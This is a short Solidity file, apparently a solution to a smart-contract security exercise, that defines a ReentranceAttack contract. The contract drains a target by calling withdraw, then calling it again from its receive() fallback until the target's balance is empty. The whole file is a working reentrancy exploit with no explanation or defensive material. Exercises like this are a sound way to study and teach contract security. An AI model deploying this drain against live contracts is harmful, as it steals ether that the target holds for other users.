//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
import "forge-std/console.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;

    receive() external payable;
}

contract ReentranceAttack {
    IReentrance reentranceContract;
    uint256 balance;

    constructor(address reentranceContractAddress) payable {
        reentranceContract = IReentrance(payable(reentranceContractAddress));
        reentranceContract.donate{value: 0.001 ether}(address(this));
        balance = msg.value;
    }

    function attack() public {
        if (reentranceContract.balanceOf(address(this)) > 0 ether) {
            reentranceContract.withdraw(0.001 ether);
        }
    }

    receive() external payable {
        if (address(reentranceContract).balance > 0) {
            reentranceContract.withdraw(0.001 ether);
        }
    }
}
